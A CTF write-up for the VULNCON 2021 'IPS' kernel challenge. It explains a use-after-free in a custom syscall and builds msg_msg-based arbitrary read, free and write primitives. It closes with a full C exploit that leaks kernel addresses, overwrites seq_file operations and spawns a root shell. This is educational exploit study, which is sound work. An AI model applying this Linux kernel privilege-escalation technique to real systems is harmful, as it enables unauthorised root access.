---
title: "Learn msg_msg-Kernel-Exploitation from a CTF challenge: IPS(VULNCON 2021)"
date: 2024-02-09 20:55:37
tags: 
layout: default
---
# IPS

# 0xFF tl;dr

Introduce a method to construct arbitrary address read (Kernel Heap Area/ Object Size < 0x1000) primitive based on `msg_msg`. 

It's also a write-up for challenge IPS(VULNCON 2021).

# 0x00 Prologue

Embarking on the VULNCON 2021 challenge marked a pivotal moment in my journey into kernel exploitation. Unlike previous challenges, this was the first non-educational kernel challenge I solved, without leaning on existing write-ups for guidance. The journey to a successful exploit took **145** days—despite the actual hours invested being considerably less. This experience paralleled my initial user space challenge, ret2win, which took me over 140 hours. The initial challenge, as always, proved to be the most formidable. However, I survived! 

Immense gratitude is extended to @kylebot and @zolutal, whose invaluable support and patience were instrumental in navigating through moments of uncertainty.

A heartfelt acknowledgment goes out to the generous authors. Their willingness to share insights and knowledge on exploitation techniques immensely facilitated my learning curve.



# 0x01 Challenge

The attachment is available here.

This challenge is not like other kernel challenges I solved - it implemented a syscall so our task for this challenge is exploiting the vulnerable syscall. The syscall IPS maintains an array of chunks while each chunk stores the user data. However, there are some interesting vulnerabilities in the syscall. 

## SYSCALL_DEFINE2

First, in `SYSCALL_DEFINE2`, here is a  `double_fetch`: It fetches `udata->data` twice: one for length check and another for copying. We can provide a valid length in check but provide a longer string while copying. However, Kyle told me it’s somehow hard to exploit so I just skipped this vulnerability. I’ll check why it’s hard to exploit later.

## copy_storage

Second, `copy_storage` didn’t check the return value of `target_idx` and `get_idx` may return `-1` when the array is full, which means `copy_storage` may copy the pointer to the `array[-1]`. Also, in `remove_storage`, we will not clean the pointer on `array[-1]`, which causes UAF.

## edit_storage

Luckily, for this function, it does nothing even if the `idx` is -1 so we can edit the `array[-1]`.

## Others

Other options in the challenge may pollute the kernel data, such as (`chunks[last_allocated_idx]->next = chunks[idx];` in `alloc_storage`). But it’s hard to use them to exploit so I only focused on the combination of `copy_storage` and `edit_storage` 

# 0x02 Exploitation Primitives

## I: Use After Free

After getting the vulnerabilities in the previous section, it’s easy to get the way to combine vulnerabilities in `copy_storage` and `edit_storage` :

- Allocate a chunk
- Call `copy_storage` 16 times to leave a pointer on `array[-1]`
- Free the allocated chunk
- So we get a pointer points to a `free()`ed chunk (size: 0x80)
- Refill this chunk with some kernel objects and operate the kernel objects by `edit_storage`

## II: msg_msg

`edit_storage` is quite strong and we can’t overwrite everything after 0xe bytes (no null byte included). I asked our kernel guys in the lab and they recommended me `msg_msg` which is super flexible.

```c
#define DATALEN_MSG	((size_t)PAGE_SIZE-sizeof(struct msg_msg))
#define DATALEN_SEG	((size_t)PAGE_SIZE-sizeof(struct msg_msgseg))

static struct msg_msg *alloc_msg(size_t len)
{
	struct msg_msg *msg;
	struct msg_msgseg **pseg;
	size_t alen;

	alen = min(len, DATALEN_MSG);
	msg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT);
	if (msg == NULL)
		return NULL;

	msg->next = NULL;
	msg->security = NULL;

	len -= alen;
	pseg = &msg->next;
	while (len > 0) {
		struct msg_msgseg *seg;

		cond_resched();

		alen = min(len, DATALEN_SEG);
		seg = kmalloc(sizeof(*seg) + alen, GFP_KERNEL_ACCOUNT);
		if (seg == NULL)
			goto out_err;
		*pseg = seg;
		seg->next = NULL;
		pseg = &seg->next;
		len -= alen;
	}

	return msg;

out_err:
	free_msg(msg);
	return NULL;
}
```

`kmalloc` is invoked in function `alloc_msg`: 

- Allocate `min([0x30+size,0x1000])`
- If the `size` is larger than `0xfd0` keep allocating space until we have enough space to store the message.
- The following `msg_msgseg` will be managed as a linked list.

For people who don’t know `msg_msg`: 

- Case study zero: If we need to refill a 0x80-byte object, we can use `msg_msg` to send a `0x80-0x30` message: 0x30 is the space for `struct msg_msg`. Also, we can send a `0xfd0+0x28` -byte message.

- Case study one: if we want to allocate a 0x20-byte object, we can use `msg_msg` to send a `0xfd0+0x18` -byte message: 0x20 is less than 0x30 so we can’t allocate a 0x20-byte chunk at the first `kmalloc`. The second malloc will allocate `size-0xfd0+0x8`  bytes, where 0x8 is the size of the `next` pointer in `struct msg_msgseg` .
    
    

## III: Arbitrary Address Read

With `msg_msg`, we can refill the freed chunk. Also, because of `edit_storage`, we can edit the struct of  `msg_msg` so we can read arbitrary addresses (as long as freeing it would not lead to a crash):

- Edit the `msg_msg.m_ts` to make it larger than 0xfd0 so we can read the content in `msg_msg.next`
- Modify `msg_msg.next` and set it to the address a little lower than the area you want to read. We’d better make sure `*(size_t *)msg_msg.next==0` since `free_msg` will try to free that pointer.
- Use `SYS_msgrcv` to receive the leaked data

## IV: Arbitrary Address Free

In `SYS_msgrcv`, the corresponding `msg_msg` struct will be freed so we can modify `msg_msg.security` or `msg_msg.next` to free arbitrary object (as long as we know where it is).

## V: Arbitrary Address Write (on KHeap)

With the `Arbitrary Address Free` primitive, it’s easy to build the AAW(Arbitrary Address Write) primitive. We can first free the object on the area we want to write and then refill it to write it.

## VI: Leak KHeap-x

With the primitives above, it seems we solved this challenge but actually, you’ll find that the kernel heap is not as deterministic as the user space heap.  The offset between pages of `kmalloc-32` to `kmalloc-128` will change. So we need a way to leak the address of `Kheap-x` 

As we know, `msg_msg` is a linked list so we can chain different sizes of messages. For example, the first `msg_msg` struct is on `kmalloc-128` while the second one is on `kmalloc-196`. So we can trace the linked list to `Kheap-x` (x≤0x1000). 

For example, in this challenge, we are on `kmalloc-128` and we can read everything on that page. So we can create another `msg_msg(size=128)` struct on the same page and append a `msg_msg(size=0x196)` to it. We can leak the address of `msg_msg(size=0x196)` by reading the next pointer of `msg_msg(size=128)`. Therefore, we can combine this skill with previous skills to read and write arbitrary addresses on kernel heap(`object_size<0x1000`)!

# 0x04 Exploitation

- Use the vulnerability to edit `msg_msg.m_ts`  to leak current page address(`kmalloc-128`) and `kernel.text` address
- Combine `VI: Leak KHeap-x` and `III: Arbitrary Address Read` to leak the address of `kmalloc-32`
- Spray `kmalloc-32` with `seq_file.op`
- Use `V: Arbitrary Address Write` to modify the function tables of `seq_file` to execute  arbitrary code

# 0x05 Exploitation Script

- I still need to fix it since it’ll give SEGFAULT after executing my shellcode
- Lots of useless stuff in the script
- Not very stable

```c
#include "libx.h"
#include <sys/syscall.h>
#include <linux/socket.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <stdint.h>
struct message {
    long mtype;
    char mtext[100];
};
typedef struct msgQueueMsg{
    long mtype;
    char mtext[1];
} msgQueueMsg;
int msgQueueSpwan(char *s){
    key_t key;
    // Generate a unique key for the message queue
    key = ftok(s, 'A');
    if (key == -1) {
        perror("ftok");
        return 1;
    }
    int msgid;
    // Create a message queue
    msgid = msgget(key, 0666 | IPC_CREAT);
    if (msgid == -1) {
        perror("msgget");
        return 1;
    }
    return msgid;
}
void msgQueueSend(int msgid,char *text,size_t size,size_t type){
    
    msgQueueMsg* msg = (msgQueueMsg *)malloc(sizeof(long)+size+0x1);
    
    // Prepare the message
    // printf("SEND...\n");
    msg->mtype = type; // Message type (can be any positive integer)
    
    strncpy(msg->mtext, text, size);
    // Send the message
    if (syscall(SYS_msgsnd, msgid, msg, size, 0) == -1) {
        perror("msgsnd");
        return ;
    }
    free(msg);
    return ;  
}
msgQueueMsg* msgQueueRecv(int msgid,size_t size,size_t type){
    msgQueueMsg* recv = (msgQueueMsg *)malloc(sizeof(long)+size+1);
    if (syscall(SYS_msgrcv, msgid, recv, size, type, 0|010000) == -1) {
        perror("msgrcv");
        return NULL;
    }
    return recv;

}
int msgQueueDel(int msgid){
    if (msgctl(msgid, IPC_RMID, NULL) == -1) {
        perror("msgctl");
        return 1;
    }
    return 0;
}
#define ISP 548
typedef struct {
  int idx;
  unsigned short priority;
  char *data;
} dt;
void add(char *buf, int priority){
    dt dt;
    dt.priority = priority;
    dt.data = buf;
    return syscall(ISP,1,&dt);
}
void del(int idx){
    dt dt;
    dt.idx = idx;
    return syscall(ISP,2,&dt);
}
void edit(int idx, char *buf){
    dt dt;
    dt.idx = idx;
    dt.data = buf;
    return syscall(ISP,3,&dt);

}
void copy(int idx){
    dt dt;
    dt.idx = idx;
    return syscall(ISP,4,&dt);
}
void stop(){
    puts("Pause");
    char buf[0x10];
    read(0,buf,0xf);
}
#define MSG 	0x2e
char *p64(size_t val){
    char *res  = malloc(0x18);
    memset(res,0,0x18);
    size_t * p = res;
    * p = val;
    return res;
}
void spray(int id){
    char *x = malloc(0x50);
    memset(x,0x69,0x50);
    msgQueueSend(id,x,0x50,1);
}
void* findLeakedP(size_t *p){
    void *leaked_heap;
    for(int i =0 ; i<(int)(0xfc0/0x8);i++){
        // info(p[i]);
        if(p[i]==0x6969696969696969 && i>4 && p[i-3]==0x50)
        {
            // info(p[i-5]);
            leaked_heap = p[i-5]>>12<<12;
            if(leaked_heap==0)
                continue;
            break;
        }
    }
    return leaked_heap;
}
void LeakHeapBase(){

}
char * prepareTrashData(){
    char *MEM = calloc(1,0x50);
    memset(MEM,0x69,0x50-1);
    return MEM;
}
/// @brief  ret2user
size_t commit_creds = NULL, prepare_kernel_cred = NULL;

size_t user_cs, user_ss, user_rflags, user_sp;

void saveStatus()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
}
void back2user(){

      __asm__("mov rax, user_ss;"
            "push rax;"
            "mov rax, user_sp;"
            "push rax;"
            "mov rax, user_rflags;"
            "push rax;"
            "mov rax, user_cs;"
            "push rax;"
            "mov rax, back2root;"
            "push rax;"
            "swapgs;"
            "push 0;"
            "popfq;"
            "iretq;"
            );
            
}
void getRootPrivilige(void)
{
    void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
    back2user();
}

void getRootShell(void)
{   
    if(getuid())
    {
        printf("\033[31m\033[1m[x] Failed to get the root!\033[0m\n");
        exit(-1);
    }

    printf("\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n");
    stop();
    execve("/bin/sh",0,0);
    
}
size_t back2root = getRootShell;
int main()
{

    char *atk = malloc(0x1000);
    memset(atk,'\1',0x1000);
    size_t *hook = &atk[0xfd0];
    hook[0] = 0xdeadbeefdeadbeef;
    hook[1] = 1;
    hook[2] = 2;
    hook[3] = 3;
    // int mx = open("/dev/ptmx",O_RDWR|O_NOCTTY);
    // printf("%d\n",mx);
    char *ctx = calloc(1,0x200);
    memcpy(ctx,"Hi IPS!",8);
    add(ctx,0xffff);
    for(int i=0;i<16;i++){
        copy(0);
    }
    // Now we have one-ptr-off, it's at list[-1].
    // It has to be a copied chunk so we can use "delete" to free it
    // To exploit, UAF is a feasible way. However,   
    // the only way to operate it in the program is "edit".
    // which can modify the data at list[-1].offset(0xe), the max length is 114 bytes

    // Here is a straightforward way to exploit
    // 1. Free the target
    // 2. Leak kernel addresses by msgmsg
    

    // Delet to create a dangling pointer
    del(0);
    int msgid   = msgQueueSpwan("/home/user/1");
    int msgid2  = msgQueueSpwan("/home/user/2");
    int msgid3  = msgQueueSpwan("/home/user/3");
    // int msgid4  = msgQueueSpwan("/home/user/4");
    // int msgid2  = msgQueueSpwan("/");
    msgQueueSend(msgid,ctx,0x50,1);
    edit(-1,"\xff\xff\1\2\3\4\5\6\7\x08\xff\xff"); 

    // spray 
    // for(int i = 0 ; i < (0x1000/0x80) ; i++)
    //     spray(msgid2);
    
    // Leak
    msgQueueMsg *res = msgQueueRecv(msgid,0xfff,0);

    size_t * dump = res->mtext;
    size_t leaked = 0 ;
    for(int i =1 ; i <(0x1000/8)-1;i++){
        if(dump[i]==0)
            continue;
        // printf("[+] %p %p %p\n",dump[i],dump[i]&0xfff,dump[i+1]&0xfff);
        if((dump[i]&0xfff)== 0x9a0 && (dump[i+1]&0xfff)==0x670){
            leaked = dump[i];
            break;
        }
    }
    if(leaked==0){
        printf("[-] Not able to leak");
        exit(1);
    }
    printf("[+][LEAK] Kernel Heap-128 %p\n",leaked);

    // Leak kheap-32

    msgQueueSend(msgid2,"Me again!",0x50,2); // -1

    char * mark = malloc(0x100);
    memset(mark,'\x69',0x100);
    msgQueueSend(msgid3,mark,0x50,3); // In heap-128
    
    // next points to heap-32
    char *probe = malloc(0x1000);
    memset(probe,'\0',0x1000);
    
    msgQueueSend(msgid3,probe,0xfd0+0x18,9); 

    // Make sure we can get it's head 
    edit(-1,strdup("\xff\xff\1\2\3\4\5\6\7\x08\xff\x0f")); 
    res = msgQueueRecv(msgid2,0xfff,0);
    dump = res->mtext;
    size_t leaked_heap32 = 0 ;
    for(int i =6 ; i <(0x1000/8)-2;i++){
        if(dump[i]==0x6969696969696969){
            leaked_heap32 = dump[i-6];
            break;
        }
    }
    if(leaked_heap32==0){
        printf("[-] Not able to leak");
        exit(1);
    }
    // printf("[+][LEAK] pointer to kheap32 %p\n",leaked_heap32);
    size_t next_target = leaked_heap32+0x20;
    msgQueueDel(msgid);
    msgid   = msgQueueSpwan("/home/user/1");
    msgQueueSend(msgid,"Me again! again!",0x50,4); // -1
    edit(-1,strcat(strdup("\xff\xff\1\2\3\4\5\6\7\x08\xff\xff\xff\xff\xff\xff\xff\xff"),p64(next_target-0x30))); 

    
    res = msgQueueRecv(msgid,0xfd0+0x38,0);
    size_t * kheap32 = &(res->mtext[0xfd0+0x30-8]);
    size_t seqop_target=*kheap32;
    
    int stats[0x80] ={0};
    for(int s = 0 ; s< 0x40 ; s++) // Just spray half page so we have the posibility to stay at the same slab node
        stats[s] = open("proc/self/stat",0);
    printf("[+][LEAK] Kernel Heap-32  %p\n",seqop_target);
    
    msgQueueDel(msgid);
    msgid   = msgQueueSpwan("/home/user/1");
    msgQueueSend(msgid,"Me again! again! again!",0x50,5); // -1
    edit(-1,strcat(strdup("\xff\xff\1\2\3\4\5\6\7\x08\xff\xff\xff\xff\xff\xff\xff\xff"),p64(seqop_target+0x20-8))); 
    res = msgQueueRecv(msgid,0xfd0+0x8,0); // AAF
    size_t * verify = &res->mtext[0xfd0];
    printf("[+][LEAK] Kernel Executable: %p\n",*verify);
    // printf("[+] %p",0xfff & (size_t)(*verify));         
    if( (0xfff & (size_t)(*verify)) != 0xfd0){
        puts("[-] Failed to free an FOP");
        exit(1);
    }
    saveStatus();

    hook[0] = getRootPrivilige;
    commit_creds = 0xffffffff8108a830-0xffffffff8120efd0+(*verify);
    prepare_kernel_cred = 0xffffffff8108aad0-0xffffffff8120efd0+(*verify);
    // Refil
    msgid   = msgQueueSpwan("/home/user/4");
    for(int s = 0; s<2;s++) // Tomake exploit more reliable
        msgQueueSend(msgid,atk,0xfd0+0x18,6+s);
        
    puts("Let's hit the fop!");
    stop();
    char x;
    for(int s = 3 ; s < 0x80;s++){
        read(s,&x,0x1);
    }
    getRootShell();
//    stop();
}
```

# 0x06 TODO

- []  Page Level Fengshui
- [ ]  Reproduce other solutions
- [ ]  Summary msg_msg
- [ ]  Solve the segfault issue
- [ ]  Make the exploit more stable
- [ ]  Fix this blog

# 0x07 Articles

I listed the articles that helped me but sorry for not listing all of them since it has been a too long time so I forgot most of them.

- [Introduction of Heap Fengshui][3]
- [LINUX-KERNEL-PWN][4]

# 0x08 Related Functions

- [seq_file(single_open)][1]
- [msg_msg][2]


[1]: https://elixir.bootlin.com/linux/latest/source/fs/seq_file.c
[2]: https://elixir.bootlin.com/linux/latest/source/ipc/msg.c
[3]: https://duasynt.com/blog/linux-kernel-heap-feng-shui-2022
[4]: https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/